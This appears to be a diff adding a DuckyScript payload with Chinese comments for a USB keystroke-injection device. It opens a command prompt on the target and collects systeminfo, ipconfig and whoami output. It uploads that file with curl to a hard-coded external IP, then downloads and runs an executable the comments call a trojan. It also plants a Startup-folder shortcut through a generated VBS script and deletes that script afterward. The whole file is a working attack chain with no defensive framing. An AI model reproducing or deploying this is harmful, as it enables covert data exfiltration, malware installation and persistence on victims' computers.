@@ -1,0 +1,81 @@
+REM 开启大写字母输入
+CAPSLOCK ON
+
+REM 打开cmd命令窗口
+GUI R
+DELAY 2000
+STRING CMD
+ENTER
+DELAY 2000
+
+REM 进入C盘根目录
+STRING CD ..
+ENTER
+DELAY 200
+
+STRING CD ..
+ENTER
+DELAY 200
+
+REM 创建操作文件夹
+STRING MKDIR USBNINJA
+ENTER
+DELAY 200
+
+REM 进入操作文件夹
+STRING CD USBNINJA
+ENTER
+DELAY 200
+
+REM 收集靶机信息
+STRING systeminfo > info.txt
+ENTER
+DELAY 1000
+
+STRING ipconfig >> info.txt
+ENTER
+DELAY 1000
+
+STRING whoami >> info.txt
+ENTER
+DELAY 1000
+
+REM 上传文件至服务器
+STRING curl -F "file=@info.txt" http://118.178.229.36:9888/upload
+ENTER
+DELAY 5000
+
+REM 下载木马程序
+STRING curl -o success.exe http://118.178.229.36:9888/uploads/success.exe
+ENTER
+DELAY 6000
+
+REM 运行木马
+STRING success.exe
+ENTER
+DELAY 5000
+
+REM 将木马添加到靶机启动项
+STRING echo Set objShell = CreateObject("WScript.Shell") > startup.vbs
+ENTER
+STRING echo strStartupFolder = objShell.SpecialFolders("Startup") >> startup.vbs
+ENTER
+STRING echo Set objLink = objShell.CreateShortcut(strStartupFolder ^& "\success.lnk") >> startup.vbs
+ENTER
+STRING echo objLink.TargetPath = "C:\USBNINJA\success.exe" >> startup.vbs
+ENTER
+STRING echo objLink.Save >> startup.vbs
+ENTER
+
+REM 运行脚本
+STRING cscript //NoLogo startup.vbs
+ENTER
+DELAY 2000
+
+REM 删除脚本
+STRING del startup.vbs
+ENTER
+DELAY 1000
+
+REM 关闭大写字母输入
+CAPSLOCK OFF
